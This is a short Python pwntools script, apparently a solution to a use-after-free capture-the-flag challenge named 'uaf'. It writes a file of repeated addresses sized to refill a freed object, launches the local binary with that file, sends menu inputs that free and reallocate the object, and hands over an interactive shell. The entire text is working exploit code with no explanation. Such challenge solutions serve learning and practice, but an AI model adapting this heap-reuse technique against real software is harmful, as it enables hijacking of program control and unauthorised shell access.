from pwn import *

size = 24
path = "/tmp/uaf_file"
data = p64(0x401588)*3
with open(path, "wb") as f:
	f.write(data)

p = process(["uaf", str(size), path])

if __name__ == "__main__":
	p.sendline("3")
	p.sendline("2")
	p.sendline("2")
	p.sendline("1")
	p.interactive()
